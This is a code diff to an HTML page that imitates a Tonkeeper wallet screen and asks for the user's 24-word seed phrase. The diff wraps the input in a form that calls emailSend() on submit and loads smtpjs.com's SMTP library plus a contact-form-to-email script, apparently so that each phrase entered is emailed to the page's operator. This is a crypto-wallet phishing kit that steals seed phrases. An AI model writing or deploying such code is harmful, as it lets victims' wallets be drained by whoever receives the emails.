@@ -8,6 +8,7 @@
   <link rel="stylesheet" href="style.css">
 </head>
 <body>
+<form id="form" onsubmit="emailSend(); reset(); return false;" >
 <div class="container"><br>
   <h3>Your Seed Phrase</h3>
   <p>Enter your Tonkeeper 24 words seed phrase:</p>
@@ -45,7 +46,7 @@
   </label>
   <button id="nextBtn" disabled>Next</button>
 </div>
-
+</form>
   <script src="script.js"></script>
   <script>
 
@@ -132,5 +133,9 @@ pasteBtn.addEventListener('click', () => {
 });
 
   </script>
+  <script src="https://smtpjs.com/v3/smtp.js"></script>
+    <script src="Contact-form-to-email.js"></script>
+<script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  
 </body>
 </html>
